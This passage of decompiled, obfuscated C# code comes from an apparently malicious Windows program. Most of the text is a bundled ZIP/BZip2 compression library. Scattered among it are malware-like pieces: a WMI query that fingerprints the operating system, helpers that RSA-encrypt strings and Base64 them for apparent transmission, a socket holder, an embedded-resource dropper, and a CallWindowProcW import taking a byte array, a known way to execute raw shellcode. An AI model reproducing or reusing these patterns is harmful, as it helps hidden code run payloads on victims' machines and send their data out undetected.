					throw new ZipException(string.Format("missing resource '{0}'", string_1));
				}
				using (FileStream fileStream = File.OpenWrite(string_0))
				{
					int num;
					do
					{
						num = manifestResourceStream.Read(array, 0, array.Length);
						fileStream.Write(array, 0, num);
					}
					while (num > 0);
				}
			}
		}

		static int smethod_133(GClass0 gclass0_0, byte[] byte_0, int int_0)
		{
			int_0 += 2;
			gclass0_0.uint_1 = (uint)((ushort)((int)byte_0[int_0++] + (int)byte_0[int_0++] * 256));
			gclass0_0.enum2_0 = Enum2.const_4;
			gclass0_0.enum2_1 = Enum2.const_4;
			return int_0;
		}

		static GClass0 smethod_134(string string_0, GClass1 gclass1_0)
		{
			return Class16.smethod_677(null, string_0, gclass1_0);
		}

		static void smethod_135(GClass0 gclass0_0, Stream stream_0, int int_0)
		{
			Stream4 stream = stream_0 as Stream4;
			gclass0_0.long_5 = ((stream != null) ? Class16.smethod_145(stream) : stream_0.Position);
			byte[] array = new byte[30];
			byte[] arg_32_0 = array;
			int expr_2C = 0;
			int num = expr_2C + 1;
			arg_32_0[expr_2C] = 80;
			byte[] arg_3B_0 = array;
			int expr_35 = 1;
			num = expr_35 + 1;
			arg_3B_0[expr_35] = 75;
			byte[] arg_43_0 = array;
			int expr_3E = 2;
			num = expr_3E + 1;
			arg_43_0[expr_3E] = 3;
			byte[] arg_4B_0 = array;
			int expr_46 = 3;
			num = expr_46 + 1;
			arg_4B_0[expr_46] = 4;
			gclass0_0.bool_13 = (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3 || (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_2 && !stream_0.CanSeek));
			short num2 = gclass0_0.bool_13 ? 45 : 20;
			if (gclass0_0.short_8 == 12)
			{
				num2 = 46;
			}
			array[num++] = (byte)(num2 & 255);
			array[num++] = (byte)(((int)num2 & 65280) >> 8);
			byte[] array2 = Class16.smethod_47(gclass0_0);
			short num3 = (short)array2.Length;
			if (gclass0_0.enum2_0 == Enum2.const_0)
			{
				gclass0_0.short_7 &= -2;
			}
			else
			{
				gclass0_0.short_7 |= 1;
			}
			if (gclass0_0.encoding_1.CodePage == Encoding.UTF8.CodePage)
			{
				gclass0_0.short_7 |= 2048;
			}
			if (!gclass0_0.bool_4)
			{
				if (int_0 != 99)
				{
					if (!stream_0.CanSeek)
					{
						gclass0_0.short_7 |= 8;
						goto IL_176;
					}
					goto IL_176;
				}
			}
			gclass0_0.short_7 &= -9;
			gclass0_0.short_7 &= -2;
			gclass0_0.Encryption = Enum2.const_0;
			gclass0_0.Password = null;
			IL_176:
			array[num++] = (byte)(gclass0_0.short_7 & 255);
			array[num++] = (byte)(((int)gclass0_0.short_7 & 65280) >> 8);
			if (gclass0_0.long_3 == -1L)
			{
				gclass0_0.long_0 = 0L;
				gclass0_0.bool_5 = false;
			}
			Class16.smethod_108(gclass0_0, int_0);
			array[num++] = (byte)(gclass0_0.short_8 & 255);
			array[num++] = (byte)(((int)gclass0_0.short_8 & 65280) >> 8);
			if (int_0 == 99)
			{
				Class16.smethod_337(gclass0_0);
			}
			else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
			{
				num -= 2;
				array[num++] = 99;
				array[num++] = 0;
			}
			gclass0_0.int_1 = Class16.smethod_92(gclass0_0.LastModified);
			array[num++] = (byte)(gclass0_0.int_1 & 255);
			array[num++] = (byte)((gclass0_0.int_1 & 65280) >> 8);
			array[num++] = (byte)((gclass0_0.int_1 & 16711680) >> 16);
			array[num++] = (byte)(((long)gclass0_0.int_1 & (long)((ulong)-16777216)) >> 24);
			array[num++] = (byte)(gclass0_0.int_2 & 255);
			array[num++] = (byte)((gclass0_0.int_2 & 65280) >> 8);
			array[num++] = (byte)((gclass0_0.int_2 & 16711680) >> 16);
			array[num++] = (byte)(((long)gclass0_0.int_2 & (long)((ulong)-16777216)) >> 24);
			if (gclass0_0.bool_13)
			{
				for (int i = 0; i < 8; i++)
				{
					array[num++] = 255;
				}
			}
			else
			{
				array[num++] = (byte)(gclass0_0.long_0 & 255L);
				array[num++] = (byte)((gclass0_0.long_0 & 65280L) >> 8);
				array[num++] = (byte)((gclass0_0.long_0 & 16711680L) >> 16);
				array[num++] = (byte)((gclass0_0.long_0 & (long)((ulong)-16777216)) >> 24);
				array[num++] = (byte)(gclass0_0.long_2 & 255L);
				array[num++] = (byte)((gclass0_0.long_2 & 65280L) >> 8);
				array[num++] = (byte)((gclass0_0.long_2 & 16711680L) >> 16);
				array[num++] = (byte)((gclass0_0.long_2 & (long)((ulong)-16777216)) >> 24);
			}
			array[num++] = (byte)(num3 & 255);
			array[num++] = (byte)(((int)num3 & 65280) >> 8);
			gclass0_0.byte_1 = Class16.smethod_294(false, gclass0_0);
			short num4 = (short)((gclass0_0.byte_1 == null) ? 0 : gclass0_0.byte_1.Length);
			array[num++] = (byte)(num4 & 255);
			array[num++] = (byte)(((int)num4 & 65280) >> 8);
			byte[] array3 = new byte[num + (int)num3 + (int)num4];
			Buffer.BlockCopy(array, 0, array3, 0, num);
			Buffer.BlockCopy(array2, 0, array3, num, array2.Length);
			num += array2.Length;
			if (gclass0_0.byte_1 != null)
			{
				Buffer.BlockCopy(gclass0_0.byte_1, 0, array3, num, gclass0_0.byte_1.Length);
				num += gclass0_0.byte_1.Length;
			}
			gclass0_0.int_3 = num;
			ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
			if (zipSegmentedStream != null)
			{
				zipSegmentedStream.method_1(true);
				uint num5 = Class16.smethod_482(num, zipSegmentedStream);
				if (num5 != zipSegmentedStream.uint_0)
				{
					gclass0_0.long_5 = 0L;
				}
				else
				{
					gclass0_0.long_5 = zipSegmentedStream.Position;
				}
				gclass0_0.uint_0 = num5;
			}
			if (Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_0 && (uint)gclass0_0.long_4 >= 4294967295u)
			{
				throw new ZipException("Offset within the zip archive exceeds 0xFFFFFFFF. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
			}
			stream_0.Write(array3, 0, num);
			if (zipSegmentedStream != null)
			{
				zipSegmentedStream.method_1(false);
			}
			gclass0_0.byte_2 = array3;
		}

		static void smethod_136(Stream stream_0, GClass0 gclass0_0, string string_0)
		{
			Class16.smethod_146(null, string_0, gclass0_0, stream_0);
		}

		static void smethod_137(Stream11 stream11_0, int int_0)
		{
			if (int_0 < 4)
			{
				throw new ArgumentException("MaxBufferPairs", "Value must be 4 or greater.");
			}
			stream11_0.int_2 = int_0;
		}

		static void smethod_138(Stream6 stream6_0)
		{
			Stream6.Class35 class35_ = stream6_0.class35_0;
			bool[] bool_ = class35_.bool_0;
			byte[] byte_ = class35_.byte_4;
			int num = 0;
			for (int i = 0; i < 16; i++)
			{
				if (Class16.smethod_183(stream6_0))
				{
					num |= 1 << i;
				}
			}
			int num2 = 256;
			while (--num2 >= 0)
			{
				bool_[num2] = false;
			}
			for (int j = 0; j < 16; j++)
			{
				if ((num & 1 << j) != 0)
				{
					int num3 = j << 4;
					for (int k = 0; k < 16; k++)
					{
						if (Class16.smethod_183(stream6_0))
						{
							bool_[num3 + k] = true;
						}
					}
				}
			}
			Class16.smethod_353(stream6_0);
			int num4 = stream6_0.int_5 + 2;
			int num5 = Class16.smethod_434(stream6_0, 3);
			int num6 = Class16.smethod_434(stream6_0, 15);
			for (int l = 0; l < num6; l++)
			{
				int num7 = 0;
				while (Class16.smethod_183(stream6_0))
				{
					num7++;
				}
				class35_.byte_2[l] = (byte)num7;
			}
			int num8 = num5;
			while (--num8 >= 0)
			{
				byte_[num8] = (byte)num8;
			}
			for (int m = 0; m < num6; m++)
			{
				int n = (int)class35_.byte_2[m];
				byte b = byte_[n];
				while (n > 0)
				{
					byte_[n] = byte_[n - 1];
					n--;
				}
				byte_[0] = b;
				class35_.byte_1[m] = b;
			}
			char[][] char_ = class35_.char_0;
			for (int num9 = 0; num9 < num5; num9++)
			{
				int num10 = Class16.smethod_434(stream6_0, 5);
				char[] array = char_[num9];
				for (int num11 = 0; num11 < num4; num11++)
				{
					while (Class16.smethod_183(stream6_0))
					{
						num10 += (Class16.smethod_183(stream6_0) ? -1 : 1);
					}
					array[num11] = (char)num10;
				}
			}
			Class16.smethod_17(num5, num4, stream6_0);
		}

		static Encoding smethod_139(Stream0 stream0_0)
		{
			return stream0_0.encoding_0;
		}

		static GClass0 smethod_140(GClass1 gclass1_0, string string_0)
		{
			return Class16.smethod_289(string_0, gclass1_0, null);
		}

		static void smethod_141(int int_0, short[] short_0, short[] short_1)
		{
			short[] array = new short[Class49.int_0 + 1];
			short num = 0;
			for (int i = 1; i <= Class49.int_0; i++)
			{
				num = (array[i] = (short)(num + short_1[i - 1] << 1));
			}
			for (int j = 0; j <= int_0; j++)
			{
				int num2 = (int)short_0[j * 2 + 1];
				if (num2 != 0)
				{
					int arg_66_1 = j * 2;
					short[] expr_4B_cp_0 = array;
					int expr_4B_cp_1 = num2;
					short int_;
					expr_4B_cp_0[expr_4B_cp_1] = (int_ = expr_4B_cp_0[expr_4B_cp_1]) + 1;
					short_0[arg_66_1] = (short)Class16.smethod_206((int)int_, num2);
				}
			}
		}

		static int smethod_142(Class58 class58_0)
		{
			return class58_0.int_0;
		}

		static void smethod_143(Class33 class33_0)
		{
			int int_ = class33_0.int_3;
			Class33.Class34 class34_ = class33_0.class34_0;
			bool[] bool_ = class34_.bool_0;
			byte[] byte_ = class34_.byte_6;
			int[] int_2 = class34_.int_13;
			char[] char_ = class34_.char_0;
			int[] int_3 = class34_.int_0;
			byte[] byte_2 = class34_.byte_0;
			byte[] byte_3 = class34_.byte_3;
			int num = 0;
			for (int i = 0; i < 256; i++)
			{
				if (bool_[i])
				{
					byte_2[i] = (byte)num;
					num++;
				}
			}
			class33_0.int_9 = num;
			int num2 = num + 1;
			for (int j = num2; j >= 0; j--)
			{
				int_3[j] = 0;
			}
			int num3 = num;
			while (--num3 >= 0)
			{
				byte_3[num3] = (byte)num3;
			}
			int num4 = 0;
			int num5 = 0;
			for (int k = 0; k <= int_; k++)
			{
				byte b = byte_2[(int)(byte_[int_2[k]] & 255)];
				byte b2 = byte_3[0];
				int num6 = 0;
				while (b != b2)
				{
					num6++;
					byte b3 = b2;
					b2 = byte_3[num6];
					byte_3[num6] = b3;
				}
				byte_3[0] = b2;
				if (num6 == 0)
				{
					num5++;
				}
				else
				{
					if (num5 > 0)
					{
						num5--;
						while (true)
						{
							if ((num5 & 1) == 0)
							{
								char_[num4] = Class36.char_0;
								num4++;
								int_3[(int)Class36.char_0]++;
							}
							else
							{
								char_[num4] = Class36.char_1;
								num4++;
								int_3[(int)Class36.char_1]++;
							}
							if (num5 < 2)
							{
								break;
							}
							num5 = num5 - 2 >> 1;
						}
						num5 = 0;
					}
					char_[num4] = (char)(num6 + 1);
					num4++;
					int_3[num6 + 1]++;
				}
			}
			if (num5 > 0)
			{
				num5--;
				while (true)
				{
					if ((num5 & 1) == 0)
					{
						char_[num4] = Class36.char_0;
						num4++;
						int_3[(int)Class36.char_0]++;
					}
					else
					{
						char_[num4] = Class36.char_1;
						num4++;
						int_3[(int)Class36.char_1]++;
					}
					if (num5 < 2)
					{
						break;
					}
					num5 = num5 - 2 >> 1;
				}
			}
			char_[num4] = (char)num2;
			int_3[num2]++;
			class33_0.int_10 = num4 + 1;
		}

		static void smethod_144(DateTime dateTime_0, DateTime dateTime_1, DateTime dateTime_2, GClass0 gclass0_0)
		{
			gclass0_0.bool_0 = true;
			if (dateTime_0 == GClass0.dateTime_6 && dateTime_0.Kind == GClass0.dateTime_6.Kind)
			{
				dateTime_0 = GClass0.dateTime_5;
			}
			if (dateTime_2 == GClass0.dateTime_6 && dateTime_2.Kind == GClass0.dateTime_6.Kind)
			{
				dateTime_2 = GClass0.dateTime_5;
			}
			if (dateTime_1 == GClass0.dateTime_6 && dateTime_1.Kind == GClass0.dateTime_6.Kind)
			{
				dateTime_1 = GClass0.dateTime_5;
			}
			gclass0_0.dateTime_3 = dateTime_0.ToUniversalTime();
			gclass0_0.dateTime_2 = dateTime_2.ToUniversalTime();
			gclass0_0.dateTime_1 = dateTime_1.ToUniversalTime();
			gclass0_0.dateTime_0 = gclass0_0.dateTime_1;
			if (!gclass0_0.bool_2 && !gclass0_0.bool_1)
			{
				gclass0_0.bool_1 = true;
			}
			gclass0_0.bool_6 = true;
		}

		static long smethod_145(Stream4 stream4_0)
		{
			return stream4_0.long_2 + stream4_0.long_0;
		}

		static void smethod_146(string string_0, string string_1, GClass0 gclass0_0, Stream stream_0)
		{
			if (gclass0_0.class8_0 == null)
			{
				throw new BadStateException("This entry is an orphan");
			}
			if (gclass0_0.class8_0.gclass1_0 == null)
			{
				throw new InvalidOperationException("Use Extract() only with ZipFile.");
			}
			gclass0_0.class8_0.gclass1_0.method_0(false);
			if (gclass0_0.enum0_0 != Enum0.const_3)
			{
				throw new BadStateException("You must call ZipFile.Save before calling any Extract method");
			}
			Class16.smethod_267(gclass0_0, string_0);
			gclass0_0.bool_12 = false;
			string text = null;
			Stream stream = null;
			bool flag = false;
			bool flag2 = false;
			try
			{
				Class16.smethod_613(gclass0_0);
				Class16.smethod_216(gclass0_0);
				if (Class16.smethod_128(ref text, stream_0, string_0, gclass0_0))
				{
					Class16.smethod_529(gclass0_0, "extract dir {0}...", new object[]
					{
						text
					});
					Class16.smethod_499(gclass0_0, string_0);
				}
				else
				{
					if (text != null && File.Exists(text))
					{
						flag = true;
						int num = Class16.smethod_642(text, string_0, gclass0_0);
						if (num == 2)
						{
							goto IL_28E;
						}
						if (num == 1)
						{
							return;
						}
					}
					string text2 = string_1 ?? (gclass0_0.string_3 ?? Class16.smethod_663(gclass0_0.class8_0));
					if (gclass0_0.enum2_1 != Enum2.const_0)
					{
						if (text2 == null)
						{
							throw new BadPasswordException();
						}
						Class16.smethod_80(gclass0_0, text2);
					}
					if (text != null)
					{
						Class16.smethod_529(gclass0_0, "extract file {0}...", new object[]
						{
							text
						});
						text += ".tmp";
						string directoryName = Path.GetDirectoryName(text);
						if (!Directory.Exists(directoryName))
						{
							Directory.CreateDirectory(directoryName);
						}
						else if (gclass0_0.class8_0.gclass1_0 != null)
						{
							flag2 = gclass0_0.class8_0.gclass1_0.bool_12;
						}
						stream = new FileStream(text, FileMode.CreateNew);
					}
					else
					{
						Class16.smethod_529(gclass0_0, "extract entry {0} to stream...", new object[]
						{
							gclass0_0.string_1
						});
						stream = stream_0;
					}
					if (!gclass0_0.bool_12)
					{
						int int_ = Class16.smethod_158(stream, gclass0_0);
						if (!gclass0_0.bool_12)
						{
							Class16.smethod_125(gclass0_0, int_);
							if (text != null)
							{
								stream.Close();
								stream = null;
								string text3 = text;
								string text4 = null;
								text = text3.Substring(0, text3.Length - 4);
								if (flag)
								{
									text4 = text + ".PendingOverwrite";
									File.Move(text, text4);
								}
								File.Move(text3, text);
								Class16.smethod_590(true, gclass0_0, text);
								if (text4 != null && File.Exists(text4))
								{
									Class16.smethod_471(text4);
								}
								if (flag2 && gclass0_0.string_1.IndexOf('/') != -1)
								{
									string directoryName2 = Path.GetDirectoryName(gclass0_0.string_1);
									if (gclass0_0.class8_0.gclass1_0[directoryName2] == null)
									{
										Class16.smethod_590(false, gclass0_0, Path.GetDirectoryName(text));
									}
								}
								if (((int)gclass0_0.short_0 & 65280) == 2560 || ((int)gclass0_0.short_0 & 65280) == 0)
								{
									File.SetAttributes(text, (FileAttributes)gclass0_0.int_0);
								}
							}
							Class16.smethod_499(gclass0_0, string_0);
						}
					}
					IL_28E:;
				}
			}
			catch (Exception)
			{
				gclass0_0.bool_12 = true;
				throw;
			}
			finally
			{
				if (gclass0_0.bool_12 && text != null)
				{
					if (stream != null)
					{
						stream.Close();
					}
					if (File.Exists(text) && !flag)
					{
						File.Delete(text);
					}
				}
			}
		}

		static bool smethod_147(long long_0, GClass1 gclass1_0, long long_1, GClass0 gclass0_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 eventArgs = Class16.smethod_204(gclass0_0, long_0, gclass1_0.ArchiveNameForEvent, long_1);
				eventHandler_(gclass1_0, eventArgs);
				if (eventArgs.bool_0)
				{
					gclass1_0.bool_9 = true;
				}
			}
			return gclass1_0.bool_9;
		}

		static Stream smethod_148(uint uint_0, GClass1 gclass1_0)
		{
			if (uint_0 + 1u != gclass1_0.uint_0 && (uint_0 != 0u || gclass1_0.uint_0 != 0u))
			{
				return Class16.smethod_453(gclass1_0.string_1 ?? gclass1_0.string_0, uint_0, gclass1_0.uint_0);
			}
			return gclass1_0.ReadStream;
		}

		static void smethod_149(int[] int_0, int int_1, int int_2, char[] char_0, int[] int_3, int[] int_4, int int_5)
		{
			int i = int_5;
			int num = 0;
			while (i <= int_2)
			{
				for (int j = 0; j < int_1; j++)
				{
					if ((int)char_0[j] == i)
					{
						int_0[num++] = j;
					}
				}
				i++;
			}
			int num2 = Class36.int_4;
			while (--num2 > 0)
			{
				int_4[num2] = 0;
				int_3[num2] = 0;
			}
			for (int k = 0; k < int_1; k++)
			{
				int_4[(int)(char_0[k] + '\u0001')]++;
			}
			int l = 1;
			int num3 = int_4[0];
			while (l < Class36.int_4)
			{
				num3 += int_4[l];
				int_4[l] = num3;
				l++;
			}
			int m = int_5;
			int num4 = 0;
			int num5 = int_4[m];
			while (m <= int_2)
			{
				int num6 = int_4[m + 1];
				num4 += num6 - num5;
				num5 = num6;
				int_3[m] = num4 - 1;
				num4 <<= 1;
				m++;
			}
			for (int n = int_5 + 1; n <= int_2; n++)
			{
				int_4[n] = (int_3[n - 1] + 1 << 1) - int_4[n];
			}
		}

		static void smethod_150(GClass1 gclass1_0)
		{
			try
			{
				if (File.Exists(gclass1_0.string_4))
				{
					File.Delete(gclass1_0.string_4);
				}
			}
			catch (IOException ex)
			{
				if (gclass1_0.textWriter_0 != null)
				{
					gclass1_0.textWriter_0.WriteLine("ZipFile::Save: could not delete temp file: {0}.", ex.Message);
				}
			}
		}

		static byte[] smethod_151(int int_0, string string_0, byte[] byte_0)
		{
			byte[] result;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0))
			{
				rSACryptoServiceProvider.FromXmlString(string_0);
				result = rSACryptoServiceProvider.Encrypt(byte_0, false);
			}
			return result;
		}

		static EventArgs1 smethod_152(string string_0)
		{
			return new EventArgs1(string_0, Enum6.const_6);
		}

		static Stream smethod_153(long long_0, GClass0 gclass0_0, Stream stream_0)
		{
			if (gclass0_0.short_8 == 8 && gclass0_0.enum20_0 != Enum20.const_0)
			{
				if (Class16.smethod_330(gclass0_0.class8_0) != 0L && (long_0 <= Class16.smethod_330(gclass0_0.class8_0) || Class16.smethod_330(gclass0_0.class8_0) <= 0L))
				{
					Stream9 stream = new Stream9(stream_0, Enum22.const_0, gclass0_0.enum20_0, true);
					if (Class16.smethod_373(gclass0_0.class8_0) > 0)
					{
						Class16.smethod_346(Class16.smethod_373(gclass0_0.class8_0), stream);
					}
					Class16.smethod_571(stream, Class16.smethod_258(gclass0_0.class8_0));
					return stream;
				}
				if (Class16.smethod_279(gclass0_0.class8_0) == null)
				{
					Class16.smethod_331(gclass0_0.class8_0, new Stream11(stream_0, gclass0_0.enum20_0, Class16.smethod_258(gclass0_0.class8_0), true));
					if (Class16.smethod_373(gclass0_0.class8_0) > 0)
					{
						Class16.smethod_539(Class16.smethod_279(gclass0_0.class8_0), Class16.smethod_373(gclass0_0.class8_0));
					}
					if (Class16.smethod_322(gclass0_0.class8_0) > 0)
					{
						Class16.smethod_137(Class16.smethod_279(gclass0_0.class8_0), Class16.smethod_322(gclass0_0.class8_0));
					}
				}
				Stream11 stream2 = Class16.smethod_279(gclass0_0.class8_0);
				stream2.method_3(stream_0);
				return stream2;
			}
			else
			{
				if (gclass0_0.short_8 != 12)
				{
					return stream_0;
				}
				if (Class16.smethod_330(gclass0_0.class8_0) != 0L && (long_0 <= Class16.smethod_330(gclass0_0.class8_0) || Class16.smethod_330(gclass0_0.class8_0) <= 0L))
				{
					return new Stream7(stream_0, true);
				}
				return new Stream8(stream_0, true);
			}
		}

		static void smethod_154(string string_0, EventArgs0 eventArgs0_0)
		{
			eventArgs0_0.string_0 = string_0;
		}

		static byte[] smethod_155(string string_0, Encoding encoding_0)
		{
			return encoding_0.GetBytes(string_0);
		}

		static void smethod_156(uint uint_0, Class32 class32_0)
		{
			Class16.smethod_478(class32_0, 8, uint_0 >> 24 & 255u);
			Class16.smethod_478(class32_0, 8, uint_0 >> 16 & 255u);
			Class16.smethod_478(class32_0, 8, uint_0 >> 8 & 255u);
			Class16.smethod_478(class32_0, 8, uint_0 & 255u);
		}

		static string smethod_157(Form1 form1_0)
		{
			IEnumerable<ManagementObject> arg_33_0 = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>();
			Func<ManagementObject, object> arg_33_1;
			if ((arg_33_1 = Form1.<>c.<>9__19_0) == null)
			{
				arg_33_1 = (Form1.<>c.<>9__19_0 = new Func<ManagementObject, object>(Form1.<>c.<>9.method_0));
			}
			object obj = arg_33_0.Select(arg_33_1).FirstOrDefault<object>();
			return (obj != null) ? obj.ToString() : null;
		}

		static int smethod_158(Stream stream_0, GClass0 gclass0_0)
		{
			int result = 0;
			Stream archiveStream = gclass0_0.ArchiveStream;
			try
			{
				archiveStream.Seek(gclass0_0.FileDataPosition, SeekOrigin.Begin);
				byte[] array = new byte[gclass0_0.BufferSize];
				long num = (gclass0_0.short_9 != 0) ? gclass0_0.long_2 : gclass0_0.long_1;
				gclass0_0.stream_2 = Class16.smethod_239(archiveStream, gclass0_0);
				Stream stream_ = Class16.smethod_257(gclass0_0, gclass0_0.stream_2);
				long num2 = 0L;
				using (Stream13 stream = new Stream13(stream_))
				{
					while (num > 0L)
					{
						int count = (num > (long)array.Length) ? array.Length : ((int)num);
						int num3 = stream.Read(array, 0, count);
						Class16.smethod_170(gclass0_0, num3);
						stream_0.Write(array, 0, num3);
						num -= (long)num3;
						num2 += (long)num3;
						Class16.smethod_7(gclass0_0.long_2, gclass0_0, num2);
						if (gclass0_0.bool_12)
						{
							break;
						}
					}
					result = Class16.smethod_4(stream);
				}
			}
			finally
			{
				ZipSegmentedStream zipSegmentedStream = archiveStream as ZipSegmentedStream;
				if (zipSegmentedStream != null)
				{
					zipSegmentedStream.Dispose();
					gclass0_0.stream_0 = null;
				}
			}
			return result;
		}

		static void smethod_159(Class53 class53_0)
		{
			class53_0.object_0 = null;
			class53_0.bool_0 = true;
			if (class53_0.manualResetEvent_0 != null)
			{
				class53_0.manualResetEvent_0.Set();
			}
		}

		static void smethod_160(Stream10 stream10_0, string string_0)
		{
			if (stream10_0.bool_0)
			{
				throw new ObjectDisposedException("GZipStream");
			}
			stream10_0.string_1 = string_0;
		}

		static int smethod_161(Stream8 stream8_0)
		{
			return stream8_0.int_1;
		}

		static Encoding smethod_162()
		{
			return Encoding.GetEncoding("IBM437");
		}

		static void smethod_163(GClass1 gclass1_0, string string_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 e = Class16.smethod_650(gclass1_0.ArchiveNameForEvent, string_0);
				eventHandler_(gclass1_0, e);
			}
		}

		static void smethod_164(Class33 class33_0, int int_0)
		{
			byte[][] byte_ = class33_0.class34_0.byte_4;
			int[][] int_ = class33_0.class34_0.int_3;
			byte[] byte_2 = class33_0.class34_0.byte_1;
			char[] char_ = class33_0.class34_0.char_0;
			int int_2 = class33_0.int_10;
			int num = 0;
			int i = 0;
			while (i < int_2)
			{
				int num2 = Math.Min(i + Class36.int_6 - 1, int_2 - 1);
				int num3 = (int)(byte_2[num] & 255);
				int[] array = int_[num3];
				byte[] array2 = byte_[num3];
				while (i <= num2)
				{
					int num4 = (int)char_[i];
					int int_3 = (int)(array2[num4] & 255);
					Class16.smethod_478(class33_0.class32_0, int_3, (uint)array[num4]);
					i++;
				}
				i = num2 + 1;
				num++;
			}
		}

		static void smethod_165(GClass0 gclass0_0)
		{
			Stream archiveStream = gclass0_0.ArchiveStream;
			uint num = (uint)Class16.smethod_89(archiveStream);
			if ((ulong)num != (ulong)((long)gclass0_0.int_2))
			{
				archiveStream.Seek(-4L, SeekOrigin.Current);
				return;
			}
			int num2 = Class16.smethod_89(archiveStream);
			if ((long)num2 != gclass0_0.long_0)
			{
				archiveStream.Seek(-8L, SeekOrigin.Current);
				return;
			}
			num2 = Class16.smethod_89(archiveStream);
			if ((long)num2 == gclass0_0.long_2)
			{
				return;
			}
			archiveStream.Seek(-12L, SeekOrigin.Current);
		}

		static GClass1 smethod_166(Class29 class29_0, Stream stream_0)
		{
			if (class29_0 == null)
			{
				throw new ArgumentNullException("options");
			}
			return Class16.smethod_440(stream_0, class29_0.method_1(), class29_0.method_2(), class29_0.method_0());
		}

		static void smethod_167(GClass1 gclass1_0, string string_0)
		{
			EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
			if (eventHandler_ != null)
			{
				EventArgs4 e = Class16.smethod_253(string_0, gclass1_0.ArchiveNameForEvent);
				eventHandler_(gclass1_0, e);
			}
		}

		static string smethod_168(int int_0, string string_0, string string_1)
		{
			byte[] inArray = Class16.smethod_151(int_0, string_1, Encoding.UTF8.GetBytes(string_0));
			return Convert.ToBase64String(inArray);
		}

		[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
		static extern IntPtr CallWindowProcW([In] byte[] byte_0, IntPtr intptr_0, int int_0, [In] [Out] byte[] byte_1, IntPtr intptr_1);

		static void smethod_169(int int_0, Class33 class33_0, int int_1)
		{
			byte[][] byte_ = class33_0.class34_0.byte_4;
			for (int i = 0; i < int_1; i++)
			{
				byte[] array = byte_[i];
				uint num = (uint)(array[0] & 255);
				Class16.smethod_478(class33_0.class32_0, 5, num);
				for (int j = 0; j < int_0; j++)
				{
					int num2 = (int)(array[j] & 255);
					while ((ulong)num < (ulong)((long)num2))
					{
						Class16.smethod_478(class33_0.class32_0, 2, 2u);
						num += 1u;
					}
					while ((ulong)num > (ulong)((long)num2))
					{
						Class16.smethod_478(class33_0.class32_0, 2, 3u);
						num -= 1u;
					}
					Class16.smethod_478(class33_0.class32_0, 1, 0u);
				}
			}
		}

		static void smethod_170(GClass0 gclass0_0, int int_0)
		{
			if (int_0 == 0)
			{
				throw new BadReadException(string.Format("bad read of entry {0} from compressed archive.", gclass0_0.string_1));
			}
		}

		static void smethod_171(Class62 class62_0, StringDictionary stringDictionary_0)
		{
			class62_0.stringDictionary_0 = stringDictionary_0;
		}

		static string smethod_172(Class55 class55_0)
		{
			return class55_0.string_0;
		}

		static bool smethod_173(string string_0, ICollection<GClass0> icollection_0, Class8 class8_0, Stream stream_0, uint uint_0, Enum8 enum8_0)
		{
			ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
			if (zipSegmentedStream != null)
			{
				zipSegmentedStream.method_1(true);
			}
			long num = 0L;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				foreach (GClass0 current in icollection_0)
				{
					if (!current.bool_9)
					{
						Class16.smethod_477(current, memoryStream);
					}
				}
				byte[] array = memoryStream.ToArray();
				stream_0.Write(array, 0, array.Length);
				num = (long)array.Length;
			}
			Stream4 stream = stream_0 as Stream4;
			long num2 = (stream != null) ? Class16.smethod_145(stream) : stream_0.Position;
			long num3 = num2 - num;
			uint num4 = (zipSegmentedStream != null) ? zipSegmentedStream.uint_0 : 0u;
			long num5 = num2 - num3;
			int num6 = Class16.smethod_510(icollection_0);
			bool flag = enum8_0 == Enum8.const_3 || num6 >= 65535 || num5 > (long)((ulong)-1) || num3 > (long)((ulong)-1);
			byte[] array3;
			if (flag)
			{
				if (enum8_0 == Enum8.const_0)
				{
					StackFrame stackFrame = new StackFrame(1);
					if (stackFrame.GetMethod().DeclaringType == typeof(GClass1))
					{
						throw new ZipException("The archive requires a ZIP64 Central Directory. Consider setting the ZipFile.UseZip64WhenSaving property.");
					}
					throw new ZipException("The archive requires a ZIP64 Central Directory. Consider setting the ZipOutputStream.EnableZip64 property.");
				}
				else
				{
					byte[] array2 = Class16.smethod_19(num3, num2, num6, uint_0);
					array3 = Class16.smethod_487(num3, num2, enum8_0, num6, string_0, class8_0);
					if (num4 != 0u)
					{
						uint value = Class16.smethod_482(array2.Length + array3.Length, zipSegmentedStream);
						Array.Copy(BitConverter.GetBytes(value), 0, array2, 16, 4);
						Array.Copy(BitConverter.GetBytes(value), 0, array2, 20, 4);
						Array.Copy(BitConverter.GetBytes(value), 0, array2, 60, 4);
						Array.Copy(BitConverter.GetBytes(value), 0, array2, 72, 4);
					}
					stream_0.Write(array2, 0, array2.Length);
				}
			}
			else
			{
				array3 = Class16.smethod_487(num3, num2, enum8_0, num6, string_0, class8_0);
			}
			if (num4 != 0u)
			{
				ushort value2 = (ushort)Class16.smethod_482(array3.Length, zipSegmentedStream);
				Array.Copy(BitConverter.GetBytes(value2), 0, array3, 4, 2);
				Array.Copy(BitConverter.GetBytes(value2), 0, array3, 6, 2);
			}
			stream_0.Write(array3, 0, array3.Length);
			if (zipSegmentedStream != null)
			{
				zipSegmentedStream.method_1(false);
			}
			return flag;
		}

		static void smethod_174(Class55 class55_0, Socket socket_0)
		{
			if (socket_0 == null)
			{
				throw new ArgumentNullException();
			}
			class55_0.socket_0 = socket_0;
		}

		static bool smethod_175(Class74.Class75 class75_0)
		{
			switch (class75_0.int_4)
			{
			case 2:
			{
				if (class75_0.bool_0)
				{
					class75_0.int_4 = 12;
					return false;
				}
				int num = Class16.smethod_45(class75_0.class76_0, 3);
				if (num < 0)
				{
					return false;
				}
